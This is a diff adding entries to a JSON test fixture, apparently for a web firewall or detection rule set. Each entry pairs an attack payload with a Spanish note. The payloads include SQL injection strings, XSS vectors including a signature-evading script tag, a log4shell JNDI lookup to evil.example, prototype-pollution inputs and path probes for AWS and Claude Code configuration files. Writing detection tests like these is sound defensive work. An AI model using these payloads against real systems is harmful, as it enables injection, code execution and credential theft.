@@ -134,6 +134,23 @@
     {"id": "log4shell-006", "rule": "log4shell", "payload": "jndi:ldap://evil.example:1389/a", "note": "JNDI sin envoltorio ${…}"},
     {"id": "proto-001", "rule": "proto_pollution", "payload": "__proto__[isAdmin]=true", "note": "pollution vía parámetro de query"},
     {"id": "proto-002", "rule": "proto_pollution", "payload": "{\"__proto__\": {\"admin\": true}}", "note": "pollution vía JSON"},
-    {"id": "proto-003", "rule": "proto_pollution", "payload": "constructor.prototype.polluted=1", "note": "pollution vía constructor"}
+    {"id": "proto-003", "rule": "proto_pollution", "payload": "constructor.prototype.polluted=1", "note": "pollution vía constructor"},
+    {"id": "sqli-100", "rule": "sqli", "payload": "1' || select password from users--", "note": "concatenación por barras seguida de palabra clave"},
+    {"id": "sqli-101", "rule": "sqli", "payload": "x'||from dual", "note": "concatenación que inyecta FROM"},
+    {"id": "sqli-102", "rule": "sqli", "payload": "?id=ABS(-1)", "note": "función SQL en un parámetro (blindaje)"},
+    {"id": "sqli-103", "rule": "sqli", "payload": "?id=CAST(1 AS INT)", "note": "CAST en un parámetro"},
+    {"id": "sqli-104", "rule": "sqli", "payload": "?id=CHAR(65)", "note": "CHAR() para obtener caracteres"},
+    {"id": "sqli-105", "rule": "sqli", "payload": "?id=COALESCE(1,2)", "note": "COALESCE en un parámetro"},
+    {"id": "sqli-106", "rule": "sqli", "payload": "?id=1 REGEXP '^a'", "note": "REGEXP como operador de comparación"},
+    {"id": "sqli-107", "rule": "sqli", "payload": "?id=1 LIKE NULL", "note": "LIKE NULL, uncommon pero es vector"},
+    {"id": "sqli-108", "rule": "sqli", "payload": "?id=1 >> 2", "note": "operador de desplazamiento como vector"},
+    {"id": "xss-100", "rule": "xss", "payload": "<x:script xmlns:x='http://www.w3.org/1999/xhtml'>alert(1)</x:script>", "note": "script con namespace: evade la firma `<script`"},
+    {"id": "xss-101", "rule": "xss", "payload": "<svg/onload=alert(1)>", "note": "SVG con handler"},
+    {"id": "xss-102", "rule": "xss", "payload": "eval(atob('YWxlcnQoMSk='))", "note": "eval con base64"},
+    {"id": "xss-103", "rule": "xss", "payload": "document.cookie", "note": "acceso a cookies vía DOM"},
+    {"id": "xss-104", "rule": "xss", "payload": "setInterval(code,1)", "note": "ejecución diferida de código"},
+    {"id": "files-100", "rule": "sensitive_files", "payload": "?f=/sys/class", "note": "reconocimiento del sistema"},
+    {"id": "files-101", "rule": "sensitive_files", "payload": "?f=/.claude/settings.json", "note": "configuración de Claude Code"},
+    {"id": "files-102", "rule": "sensitive_files", "payload": "?f=/.aws/config", "note": "configuración de AWS"}
   ]
 }
